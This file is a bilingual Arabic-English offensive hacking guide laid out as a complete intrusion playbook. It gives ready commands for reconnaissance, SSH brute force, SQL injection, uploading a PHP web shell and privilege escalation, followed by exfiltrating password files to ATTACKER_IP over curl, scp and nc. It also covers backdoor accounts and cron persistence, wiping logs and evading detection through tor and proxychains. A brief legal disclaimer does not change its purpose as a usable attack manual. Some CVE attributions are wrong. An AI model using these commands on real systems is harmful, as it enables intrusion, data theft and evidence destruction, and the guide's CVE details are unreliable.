#!/usr/bin/env bash
"""
🔥 MANUAL HACKING GUIDE - دليل الهجوم اليدوي
خطوة بخطوة - كـ hacker حقيقي
"""

═══════════════════════════════════════════════════════════════════════════════
🎯 CYBER MIRAGE - MANUAL HACKING GUIDE
دليل الهجوم اليدوي - افعله بنفسك!
═══════════════════════════════════════════════════════════════════════════════

⚠️ تنبيه قانوني:
   استخدم هذه الخطوات فقط على أنظمة تملكها أو لديك إذن كتابي للاختبار
   الهجوم غير المصرح على أنظمة الآخرين قد يكون جريمة فيدرالية!

═══════════════════════════════════════════════════════════════════════════════

🔴 الخطوة 1: تحديد الهدف
═══════════════════════════════════════════════════════════════════════════════

أولاً: أنت تحتاج IP الهدف
مثال: 192.168.1.100 أو domain.com

في الـ PowerShell على Windows:
   # اكتشف الأجهزة على الشبكة:
   arp -a
   
   # أو استخدم Nmap:
   nmap 192.168.1.0/24

في Linux/Mac:
   # اكتشف الأجهزة:
   arp-scan -l
   nmap -sn 192.168.1.0/24
   ifconfig


🔴 الخطوة 2: استطلاع المعلومات (Reconnaissance)
═══════════════════════════════════════════════════════════════════════════════

الهدف: جمع أكبر معلومات ممكنة عن الهدف

1️⃣ معلومات DNS:
   $ nslookup domain.com
   $ dig domain.com
   $ host domain.com

2️⃣ معلومات WHOIS:
   $ whois domain.com
   $ whois 192.168.1.100

3️⃣ البحث عن الفروعات (Subdomains):
   $ nslookup -type=NS domain.com
   $ dig +short ns domain.com
   $ amass enum -d domain.com

4️⃣ البحث في محركات البحث:
   Google: site:domain.com
   Shodan: hostname:domain.com
   Censys: 192.168.1.100

5️⃣ معلومات الشركة:
   LinkedIn: موظفين وتفاصيل الشركة
   Glassdoor: موظفين وتقنيات مستخدمة
   GitHub: كود مصدري قد يحتوي على مفاتيح API


🔴 الخطوة 3: مسح المنافذ (Port Scanning)
═══════════════════════════════════════════════════════════════════════════════

الهدف: معرفة أي خدمات مشغلة على الهدف

أمر Nmap الأساسي:
   $ nmap 192.168.1.100

أوامر أكثر تفصيلاً:
   # Port scan سريع:
   $ nmap -F 192.168.1.100

   # Port scan شامل:
   $ nmap -p- 192.168.1.100

   # Port scan مع تحديد الإصدار:
   $ nmap -sV 192.168.1.100

   # Port scan عدواني:
   $ nmap -A 192.168.1.100

   # Port scan صامت (Stealth):
   $ nmap -sS 192.168.1.100

   # من Windows PowerShell:
   $ Test-NetConnection 192.168.1.100 -Port 80
   $ Test-NetConnection 192.168.1.100 -Port 22

النتائج المهمة:
   PORT      STATE  SERVICE
   22/tcp    open   ssh
   80/tcp    open   http
   443/tcp   open   https
   3306/tcp  open   mysql
   5432/tcp  open   postgresql

👉 المنافذ المهمة للـ hacker:
   22   - SSH (Remote access)
   80   - HTTP (Web server)
   443  - HTTPS (Web server)
   3306 - MySQL (Database)
   5432 - PostgreSQL (Database)
   445  - SMB (File sharing)
   3389 - RDP (Remote Desktop)


🔴 الخطوة 4: تحديد الخدمات والإصدارات
═══════════════════════════════════════════════════════════════════════════════

الهدف: معرفة البرنامج والإصدار بالضبط

أمر Nmap:
   $ nmap -sV 192.168.1.100

مثال النتيجة:
   22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
   80/tcp  open  http    Apache httpd 2.4.6
   3306/tcp open mysql   MySQL 5.7.10

الخطوة التالية: ابحث عن CVE لهذه الإصدارات!


🔴 الخطوة 5: البحث عن الثغرات (CVE Search)
═══════════════════════════════════════════════════════════════════════════════

الهدف: اكتشاف الثغرات المعروفة

استخدم أدوات البحث:
   1. https://cve.mitre.org
   2. https://www.exploit-db.com
   3. https://nvd.nist.gov
   4. Metasploit Framework

أمثلة:
   OpenSSH 7.4 CVEs:
      CVE-2018-15473 - Username Enumeration
      CVE-2019-9193 - RC Bypass
   
   Apache 2.4.6 CVEs:
      CVE-2017-9798 - Optionsbleed
      CVE-2016-5387 - HTTP Response Splitting

البحث المحلي:
   $ searchsploit "Apache 2.4.6"
   $ searchsploit "OpenSSH 7.4"


🔴 الخطوة 6: مسح التطبيق الويب
═══════════════════════════════════════════════════════════════════════════════

إذا كان هناك web server على المنفذ 80 أو 443:

أمر Nikto:
   $ nikto -h http://192.168.1.100

أوامر curl:
   $ curl -v http://192.168.1.100/
   $ curl -I http://192.168.1.100/

البحث اليدوي:
   1. زيارة http://192.168.1.100 في المتصفح
   2. البحث عن login pages
   3. البحث عن default pages (/admin, /index.php, /config.php)
   4. استخراج معلومات المتصفح (Right Click → Inspect → Network tab)

أوامر Burp Suite:
   1. قم بفتح Burp Suite
   2. ضع proxy على 127.0.0.1:8080
   3. اذهب إلى http://192.168.1.100
   4. شاهد جميع الطلبات والاستجابات


🔴 الخطوة 7: هجوم SSH Brute Force
═══════════════════════════════════════════════════════════════════════════════

إذا كان المنفذ 22 (SSH) مفتوحاً:

تحضير:
   1. اجعل قائمة بأسماء المستخدمين:
      root, admin, user, ubuntu, centos, test, oracle, postgres

   2. اجعل قائمة كلمات سر (wordlist):
      password, 123456, admin123, letmein, welcome, etc.
      أو استخدم rockyou.txt

الطريقة 1: استخدام Hydra (الأفضل):
   $ hydra -l admin -P passwords.txt ssh://192.168.1.100
   $ hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100

الطريقة 2: استخدام SSH مباشرة:
   $ ssh admin@192.168.1.100
   (اكتب كلمات السر يدويّاً)

الطريقة 3: استخدام sshpass:
   $ sshpass -p "password" ssh admin@192.168.1.100

الطريقة 4: يدويّاً من PowerShell (Windows):
   $ $cred = Get-Credential
   $ $ssh = New-SSHSession -ComputerName 192.168.1.100 -Credential $cred
   $ Invoke-SSHCommand -SessionId 0 -Command "id"

✅ إذا نجحت! ستحصل على shell:
   admin@target:~$ 


🔴 الخطوة 8: SQL Injection
═══════════════════════════════════════════════════════════════════════════════

إذا كان هناك نموذج login على الموقع:

المحاولات اليدوية:
   Username: admin' OR '1'='1' --
   Password: anything
   
   Username: ' OR 1=1 --
   Password: (اترك فارغاً)

استخدام sqlmap:
   $ sqlmap -u "http://192.168.1.100/login.php" --data="username=admin&password=pass" --dbs
   $ sqlmap -u "http://192.168.1.100/index.php?id=1" --dbs
   $ sqlmap -u "http://192.168.1.100/index.php?id=1" --tables
   $ sqlmap -u "http://192.168.1.100/index.php?id=1" --dump

استخدام Burp Suite:
   1. اعترض طلب login
   2. أرسله إلى Intruder
   3. ضع payloads
   4. اختبر


🔴 الخطوة 9: Web Shell Upload
═══════════════════════════════════════════════════════════════════════════════

إذا وجدت صفحة upload:

أنشئ shell.php:
   <?php system($_GET['cmd']); ?>

أو shell.aspx (للـ Windows):
   <%@ Page Language="C#" %>
   <% System.Diagnostics.Process.Start("calc.exe"); %>

رفع الملف:
   1. انسخ الملف
   2. ارفعه عبر الموقع
   3. ادخل إلى الرابط:
      http://192.168.1.100/uploads/shell.php?cmd=id

النتيجة:
   uid=33(www-data) gid=33(www-data) groups=33(www-data)


🔴 الخطوة 10: Privilege Escalation (رفع الصلاحيات)
═══════════════════════════════════════════════════════════════════════════════

بعد الحصول على shell كمستخدم عادي:

الخطوة 1: اكتشف معلومات النظام:
   $ uname -a
   $ cat /etc/issue
   $ cat /etc/lsb-release

الخطوة 2: تحقق من Sudo:
   $ sudo -l
   
   إذا كان الناتج:
   (ALL) NOPASSWD: /usr/bin/python
   
   يمكنك:
   $ sudo python -c "import pty; pty.spawn('/bin/bash')"

الخطوة 3: ابحث عن SUID binaries:
   $ find / -perm -4000 -type f 2>/dev/null

   مثال: إذا وجدت cp:
   $ cp /etc/shadow /tmp/shadow
   $ cat /tmp/shadow

الخطوة 4: ابحث عن Kernel Exploits:
   $ uname -a
   ثم ابحث عن CVE لهذا الإصدار

الخطوة 5: استخدم LinEnum:
   $ curl -s http://ATTACKER_IP/LinEnum.sh | bash

النتيجة: root@target:~# 


🔴 الخطوة 11: سرقة البيانات
═══════════════════════════════════════════════════════════════════════════════

بعد الوصول الكامل:

نسخ الملفات الحساسة:
   $ tar czf data.tar.gz /etc/shadow /etc/passwd /home/*/
   $ zip -r sensitive.zip /var/www/html/ /opt/

إرسال البيانات إلى جهازك:
   # من الهدف:
   $ scp data.tar.gz attacker@ATTACKER_IP:/tmp/
   
   # أو:
   $ curl -F 'file=@data.tar.gz' http://ATTACKER_IP:8888/upload
   
   # أو:
   $ nc -q 1 ATTACKER_IP 8888 < data.tar.gz

قواعد البيانات:
   $ mysqldump -u root -p'password' --all-databases > db.sql
   $ pg_dumpall > postgres.sql


🔴 الخطوة 12: Persistence (البقاء داخل النظام)
═══════════════════════════════════════════════════════════════════════════════

لضمان الوصول المستقبلي:

الطريقة 1: إضافة مستخدم:
   # من root:
   $ useradd -m -s /bin/bash -G sudo backdoor
   $ echo 'backdoor:password123' | chpasswd

الطريقة 2: SSH Key Injection:
   # من على جهازك (Generate key):
   $ ssh-keygen -t rsa -f ~/.ssh/backdoor_key
   
   # من الهدف:
   $ mkdir -p ~/.ssh
   $ echo 'ssh-rsa AAAA...your_public_key...' >> ~/.ssh/authorized_keys

الطريقة 3: Cron Job:
   $ (crontab -l 2>/dev/null; echo '* * * * * /tmp/backdoor.sh') | crontab -

الطريقة 4: Web Shell:
   $ cp shell.php /var/www/html/
   $ curl http://target/shell.php?cmd=whoami


🔴 الخطوة 13: محو الآثار
═══════════════════════════════════════════════════════════════════════════════

⚠️ تنبيه: محو الآثار قد يكون غير قانوني!

حذف سجلات الدخول:
   $ history -c
   $ cat /dev/null > ~/.bash_history

حذف سجلات SSH:
   $ cat /dev/null > ~/.ssh/known_hosts

حذف سجلات النظام:
   $ truncate -s 0 /var/log/auth.log
   $ truncate -s 0 /var/log/syslog
   $ truncate -s 0 /var/log/apache2/access.log


═══════════════════════════════════════════════════════════════════════════════
📋 QUICK REFERENCE - ملخص الأوامر
═══════════════════════════════════════════════════════════════════════════════

# استطلاع
nslookup domain.com
whois 192.168.1.100
amass enum -d domain.com

# مسح
nmap -A 192.168.1.100
nmap -sV 192.168.1.100

# تطبيق الويب
nikto -h http://192.168.1.100
sqlmap -u "http://192.168.1.100/login.php" --dbs

# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100
ssh admin@192.168.1.100

# Web Shell
curl http://192.168.1.100/shell.php?cmd=id

# Privilege Escalation
sudo -l
find / -perm -4000 -type f

# البيانات
scp file.txt attacker@ATTACKER_IP:/tmp/

# محو الآثار
history -c
cat /dev/null > ~/.bash_history


═══════════════════════════════════════════════════════════════════════════════
🎯 تخطيط الهجوم - Attack Timeline
═══════════════════════════════════════════════════════════════════════════════

يوم 1: Reconnaissance (استطلاع)
  └─ جمع معلومات DNS, WHOIS, Google Dorks

يوم 2: Scanning (مسح)
  └─ Nmap port scan
  └─ تحديد الخدمات والإصدارات

يوم 3: Enumeration (تعداد)
  └─ Nikto لـ Web apps
  └─ SMB shares enum
  └─ User enumeration

يوم 4: Vulnerability Analysis (تحليل الثغرات)
  └─ بحث عن CVEs
  └─ اختبار SQL Injection
  └─ اختبار XSS

يوم 5: Exploitation (استغلال)
  └─ الاستفادة من الثغرات
  └─ Gaining shell access

يوم 6: Post-Exploitation (ما بعد الاستغلال)
  └─ Privilege Escalation
  └─ سرقة البيانات

يوم 7: Persistence + Anti-Forensics (البقاء + محو الآثار)
  └─ تثبيت Backdoors
  └─ حذف السجلات


═══════════════════════════════════════════════════════════════════════════════
⚠️ نصائح الأمان
═══════════════════════════════════════════════════════════════════════════════

1. استخدم VPN و Proxy:
   $ torsocks nmap 192.168.1.100
   $ proxychains curl http://192.168.1.100

2. استخدم Burp Suite مع Proxy:
   https://portswigger.net/burp

3. تغطية المسارات:
   $ ssh -D 1080 attacker@proxy.server
   $ proxychains ssh admin@192.168.1.100

4. تجنب الكشف:
   $ nmap -sS 192.168.1.100  (Stealth scan)
   $ nmap -f 192.168.1.100   (Fragment packets)

5. استخدم أداة Metasploit Framework:
   $ msfconsole
   > search apache 2.4.6
   > use exploit/linux/http/apache_optionsbleed


═══════════════════════════════════════════════════════════════════════════════
✅ الخطوة التالية
═══════════════════════════════════════════════════════════════════════════════

1. اختر هدفاً من أجهزتك على الشبكة المحلية
2. ابدأ بـ nmap scan:
   $ nmap -A <TARGET_IP>

3. ابحث عن الخدمات المفتوحة
4. اختبر الثغرات يدويّاً
5. استخدم الأدوات عند الحاجة

Good luck, hacker! 🔥

═══════════════════════════════════════════════════════════════════════════════
